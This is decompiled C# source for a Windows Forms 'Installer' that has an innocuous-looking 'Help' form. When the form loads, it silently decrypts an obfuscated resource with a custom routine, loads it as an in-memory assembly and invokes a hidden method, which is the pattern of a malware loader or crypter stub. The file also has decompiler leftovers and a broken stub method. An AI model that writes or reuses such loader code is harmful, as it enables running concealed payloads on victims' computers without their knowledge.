using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Installer.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace Installer;

[DesignerGenerated]
public class Help : Form
{
	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	private Assembly chocolate;

	internal virtual _003F Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual _003F Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	public Help()
	{
		((Form)this).add_Load((EventHandler)Help_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Help));
		Label1 = new Label();
		Button1 = new Button();
		((Control)this).SuspendLayout();
		((Label)Label1).set_AutoSize(true);
		object label = (object)Label1;
		Point location = new Point(12, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		object label2 = (object)Label1;
		Size size = new Size(3712, 39);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		((Label)Label1).set_Text(componentResourceManager.GetString("Label1.Text"));
		object button = (object)Button1;
		location = new Point(729, 156);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		object button2 = (object)Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(1536, 261);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)Button1);
		((Control)this).get_Controls().Add((Control)Label1);
		((Control)this).set_Name("Help");
		((Form)this).set_Text("Help");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public static byte[] Decrypt(byte[] input, int key)
	{
		checked
		{
			int num = input.Length - 2;
			int num2;
			for (num2 = 0; num2 <= num; num2 += 2)
			{
				int num3 = input[num2];
				int num4 = input[num2 + 1];
				int i = 2 * num4 - key - num3;
				int j;
				for (j = key - num3 + num4; j < 0; j += 256)
				{
				}
				for (; i < 0; i += 256)
				{
				}
				input[num2] = (byte)unchecked(j % 256);
				num2++;
				input[num2] = (byte)unchecked(i % 256);
				num2--;
			}
			return input;
		}
	}

	private void Help_Load(object sender, EventArgs e)
	{
		byte[] rawAssembly = Decrypt((byte[])((ResourceManager)Resources.unknown_0).GetObject((string)Resources.unknown_3), Conversions.ToInteger((string)Resources.unknown_2));
		chocolate = AppDomain.CurrentDomain.Load(rawAssembly);
		Type type = chocolate.GetTypes()[5];
		MethodInfo[] methods = type.GetMethods();
		foreach (MethodInfo methodInfo in methods)
		{
			if (Operators.CompareString(methodInfo.Name, "j", false) == 0)
			{
				methodInfo.Invoke(null, new object[0]);
			}
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	static int smethod_0()
	{
		/*Error: Unexpected end of block*/;
	}
}
